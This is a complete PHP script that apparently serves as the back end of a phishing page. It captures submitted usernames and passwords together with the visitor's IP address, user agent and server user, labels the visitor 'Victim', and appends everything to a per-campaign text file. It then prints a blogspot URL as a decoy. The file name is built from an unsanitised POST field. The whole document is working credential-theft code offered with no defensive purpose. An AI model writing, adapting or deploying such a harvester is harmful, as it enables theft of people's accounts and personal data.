<?php 
$time = date("his");
$x = $_POST["x"];
$dir = dirname(__FILE__).'/files/'.$x;

if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check if ip is pass from proxy
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }

$browser = $_SERVER['HTTP_USER_AGENT'];
$useragent = "User-Agent: " . $browser;

$user = get_current_user(); 

$file = 'ip.txt';  //this is the file to which the IP address will be written; name it your way.
$victim = "\r\n"."Victim Public IP: " . $ipaddress;

$currentuser = "\r\n" . "\r\n" . "Current logged in user: " . $user ."\r\n";

if ( file_exists( dirname(__FILE__).'/files/'.$x.".txt" )) {
file_put_contents("$dir.txt",  "\n\rUserName:- " . $_POST['user'] . "\n" . "Password:- " . $_POST['psd'] . "\n\n".$victim."\n\r".$useragent."\n\r".$currentuser."----------------------", FILE_APPEND);
echo "https://presentnews360.blogspot.com";
}
else{
echo "https://presentnews360.blogspot.com";
}
?>